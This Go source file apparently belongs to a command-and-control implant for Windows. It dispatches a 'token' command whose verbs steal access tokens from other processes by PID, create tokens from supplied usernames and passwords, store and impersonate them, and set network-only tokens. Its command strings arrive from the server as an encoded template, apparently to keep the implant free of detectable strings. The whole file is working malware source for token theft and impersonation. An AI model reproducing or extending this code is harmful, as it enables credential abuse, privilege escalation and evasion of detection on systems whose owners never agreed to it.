// server/docker/payloads/Windows/action_token_windows.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"strconv"
	"strings"
	"sync"
	"time"
)

// CredCfg holds the server-side template for token commands
type CredCfg struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Shared template storage for all token-related commands
var (
	tokTemplate   []string
	tokTemplateMu sync.RWMutex
)

// SetTokenTemplate stores the template for use by all token commands
func SetTokenTemplate(templates []string) {
	tokTemplateMu.Lock()
	tokTemplate = templates
	tokTemplateMu.Unlock()
}

// tokTpl retrieves a template string by index with mutex protection
func tokTpl(idx int) string {
	tokTemplateMu.RLock()
	defer tokTemplateMu.RUnlock()
	if tokTemplate != nil && idx < len(tokTemplate) {
		return tokTemplate[idx]
	}
	return ""
}

// Token template indices (must match server's common.go)
const (
	// Verbs (451-464)
	idxTokVerbCreate      = 451
	idxTokVerbSteal       = 452
	idxTokVerbStore       = 453
	idxTokVerbUse         = 454
	idxTokVerbImpersonate = 455
	idxTokVerbNetonly     = 456
	idxTokVerbList        = 457
	idxTokVerbStored      = 458
	idxTokVerbCurrent     = 459
	idxTokVerbStatus      = 460
	idxTokVerbRemove      = 461
	idxTokVerbClear       = 462
	idxTokVerbRevert      = 463
	idxTokVerbRev2self    = 464

	// Subcommand actions (465-466)
	idxTokActSet       = 465
	idxTokActProcesses = 466

	// Logon types (467-474)
	idxTokLogonNetwork      = 467
	idxTokLogonBatch        = 468
	idxTokLogonService      = 469
	idxTokLogonNetCleartext = 470
	idxTokLogonNetClear     = 471
	idxTokLogonNewCreds     = 472
	idxTokLogonNewCredsAlt  = 473
	idxTokLogonInteractive  = 474

	// Source identifiers (476-479)
	idxTokSourceStolen  = 476
	idxTokSourceCreated = 477
	idxTokStolenCmp     = 478
	idxTokCreatedCmp    = 479

	// Token types (480-481)
	idxTokTypeImpersonation = 480
	idxTokTypePrimary       = 481

	// Utility strings (482-496)
	idxTokUnknownLower = 482
	idxTokUnknown      = 483
	idxTokBackslash    = 484
	idxTokNewline      = 485
	idxTokUnderscore   = 486
	idxTokSpace        = 487
	idxTokColon        = 488
	idxTokPipe         = 489
	idxTokNone         = 490
	idxTokDots         = 491
	idxTokAtSign       = 492
	idxTokDot          = 493
	idxTokComma        = 494
	idxTokMode0        = 495
	idxTokMode1        = 496

	// Output format strings (497-516)
	idxTokTokenInfo      = 497
	idxTokProcessUser    = 498
	idxTokImpTokenPrefix = 499
	idxTokUserPrefix     = 500
	idxTokSourcePrefix   = 501
	idxTokProcessPrefix  = 502
	idxTokPidPrefix      = 503
	idxTokPidSuffix      = 504
	idxTokLogonPrefix    = 505
	idxTokNoActiveImp    = 506
	idxTokNetOnlyTokPre  = 507
	idxTokOrigUserPre    = 508
	idxTokNetOnlyHdr     = 509
	idxTokActiveNetPre   = 510
	idxTokUserPre2       = 511
	idxTokSourcePre2     = 512
	idxTokProcessPre2    = 513
	idxTokLogonPre2      = 514
	idxTokNetOnlyToksHdr = 515
	idxTokIndent2        = 516
)

// Convenience functions for token verbs with fallbacks
func tokVerbCreate() string { return tokTpl(idxTokVerbCreate) }

func tokVerbSteal() string { return tokTpl(idxTokVerbSteal) }

func tokVerbStore() string { return tokTpl(idxTokVerbStore) }

func tokVerbUse() string { return tokTpl(idxTokVerbUse) }

func tokVerbImpersonate() string { return tokTpl(idxTokVerbImpersonate) }

func tokVerbNetonly() string { return tokTpl(idxTokVerbNetonly) }

func tokVerbList() string { return tokTpl(idxTokVerbList) }

func tokVerbStored() string { return tokTpl(idxTokVerbStored) }

func tokVerbCurrent() string { return tokTpl(idxTokVerbCurrent) }

func tokVerbStatus() string { return tokTpl(idxTokVerbStatus) }

func tokVerbRemove() string { return tokTpl(idxTokVerbRemove) }

func tokVerbClear() string { return tokTpl(idxTokVerbClear) }

func tokVerbRevert() string { return tokTpl(idxTokVerbRevert) }

func tokVerbRev2self() string { return tokTpl(idxTokVerbRev2self) }

func tokActSet() string { return tokTpl(idxTokActSet) }

func tokActProcesses() string { return tokTpl(idxTokActProcesses) }

func tokDefInteractive() string { return tokTpl(idxTokLogonInteractive) }

// CredMsg consolidates all token management functionality
type CredMsg struct {
	tpl *CredCfg
}

func (c *CredMsg) execute(ctx *OpCtx, args []string) OpResult {
	// Parse template from command data if present
	if ctx.CurrentMsg.Data != "" {
		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
		if err == nil {
			c.tpl = &CredCfg{}
			if json.Unmarshal(decoded, c.tpl) == nil && c.tpl.Templates != nil {
				SetTokenTemplate(c.tpl.Templates)
			}
		}
	}

	if len(args) == 0 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	verb := strings.ToLower(args[0])
	verbArgs := args[1:]

	switch verb {
	// === Token Creation ===
	case tokVerbCreate():
		return c.handleCreate(ctx, verbArgs)

	// === Token Stealing ===
	case tokVerbSteal():
		return c.handleSteal(ctx, verbArgs)
	case tokVerbStore():
		return c.handleStore(ctx, verbArgs)

	// === Token Usage ===
	case tokVerbUse():
		return c.handleUse(ctx, verbArgs)
	case tokVerbImpersonate():
		return c.handleImpersonate(ctx)

	// === Network-Only Management ===
	case tokVerbNetonly():
		return c.handleNetOnly(ctx, verbArgs)

	// === Token Listing/Info ===
	case tokVerbList():
		return c.handleList(ctx, verbArgs)
	case tokVerbStored():
		return c.handleStored(ctx)
	case tokVerbCurrent(), tokVerbStatus():
		return c.handleCurrent(ctx)

	// === Token Cleanup ===
	case tokVerbRemove():
		return c.handleRemove(ctx, verbArgs)
	case tokVerbClear():
		return c.handleClear(ctx)
	case tokVerbRevert(), tokVerbRev2self():
		// Allow both for compatibility
		return c.handleRevert(ctx)

	default:
		return OpResult{
			Output:      ErrCtx(E2, verb),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Creation (from make-token)
// ============================================================================

func (c *CredMsg) handleCreate(ctx *OpCtx, args []string) OpResult {
	// Delegate to existing AuthCreateMsg logic
	makeToken := &AuthCreateMsg{}

	if len(args) == 0 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	// Handle 'token create netonly' specially
	if args[0] == tokVerbNetonly() {
		if len(args) < 4 {
			return OpResult{
				Output:      Err(E1),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}
		return makeToken.createNetOnlyToken(ctx, args[1], args[2], args[3])
	}

	// Regular token creation
	if len(args) < 3 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	userpass := args[0]
	password := args[1]
	tokenName := args[2]
	logonType := tokDefInteractive()
	if len(args) > 3 {
		logonType = args[3]
	}

	return makeToken.createToken(ctx, userpass, password, tokenName, logonType)
}

// ============================================================================
// Token Stealing (from steal-token)
// ============================================================================

func (c *CredMsg) handleSteal(ctx *OpCtx, args []string) OpResult {
	stealToken := &AuthCaptureMsg{}

	if len(args) < 1 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return OpResult{
			Output:      ErrCtx(E2, args[0]),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	name := ""
	netOnly := false

	// Parse additional arguments for name and netonly flag
	for i := 1; i < len(args); i++ {
		if strings.ToLower(args[i]) == tokVerbNetonly() {
			netOnly = true
		} else if name == "" {
			name = args[i]
		}
	}

	return stealToken.stealAndImpersonate(ctx, pid, name, netOnly)
}

func (c *CredMsg) handleStore(ctx *OpCtx, args []string) OpResult {
	stealToken := &AuthCaptureMsg{}

	if len(args) < 2 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return OpResult{
			Output:      ErrCtx(E2, args[0]),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 2 && strings.ToLower(args[2]) == tokVerbNetonly() {
		netOnly = true
	}

	return stealToken.storeToken(ctx, pid, args[1], netOnly)
}

// ============================================================================
// Token Usage
// ============================================================================

func (c *CredMsg) handleUse(ctx *OpCtx, args []string) OpResult {
	stealToken := &AuthCaptureMsg{}

	if len(args) < 1 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	netOnly := false
	if len(args) > 1 && strings.ToLower(args[1]) == tokVerbNetonly() {
		netOnly = true
	}

	return stealToken.useStoredToken(ctx, args[0], netOnly)
}

func (c *CredMsg) handleImpersonate(ctx *OpCtx) OpResult {
	makeToken := &AuthCreateMsg{}
	return makeToken.impersonateToken(ctx)
}

// ============================================================================
// Network-Only Management
// ============================================================================

func (c *CredMsg) handleNetOnly(ctx *OpCtx, args []string) OpResult {
	stealToken := &AuthCaptureMsg{}

	if len(args) == 0 {
		return stealToken.showNetOnlyStatus()
	}

	action := strings.ToLower(args[0])
	switch action {
	case tokActSet():
		if len(args) < 2 {
			return OpResult{
				Output:      Err(E1),
				EC:    1,
				Done: time.Now().Format(time.RFC3339),
			}
		}
		return stealToken.setNetOnlyToken(ctx, args[1])

	case tokVerbClear():
		return stealToken.clearNetOnlyToken(ctx)

	case tokVerbStatus():
		return stealToken.showNetOnlyStatus()

	default:
		return OpResult{
			Output:      ErrCtx(E2, action),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}
}

// ============================================================================
// Token Listing/Info
// ============================================================================

func (c *CredMsg) handleList(ctx *OpCtx, args []string) OpResult {
	// Check if they want to list processes (token list processes)
	if len(args) > 0 && args[0] == tokActProcesses() {
		stealToken := &AuthCaptureMsg{}
		return stealToken.listTokens()
	}

	// Otherwise show stored tokens
	return c.handleStored(ctx)
}

func (c *CredMsg) handleStored(ctx *OpCtx) OpResult {
	stealToken := &AuthCaptureMsg{}
	return stealToken.listStoredTokens()
}

func (c *CredMsg) handleCurrent(ctx *OpCtx) OpResult {
	stealToken := &AuthCaptureMsg{}
	return stealToken.getCurrentTokenInfo()
}

// ============================================================================
// Token Cleanup
// ============================================================================

func (c *CredMsg) handleRemove(ctx *OpCtx, args []string) OpResult {
	stealToken := &AuthCaptureMsg{}

	if len(args) < 1 {
		return OpResult{
			Output:      Err(E1),
			EC:    1,
			Done: time.Now().Format(time.RFC3339),
		}
	}

	return stealToken.removeStoredToken(ctx, args[0])
}

func (c *CredMsg) handleClear(ctx *OpCtx) OpResult {
	makeToken := &AuthCreateMsg{}
	return makeToken.clearTokens(ctx)
}

func (c *CredMsg) handleRevert(ctx *OpCtx) OpResult {
	rev2self := &AuthResetMsg{}
	return rev2self.execute(ctx, []string{})
}
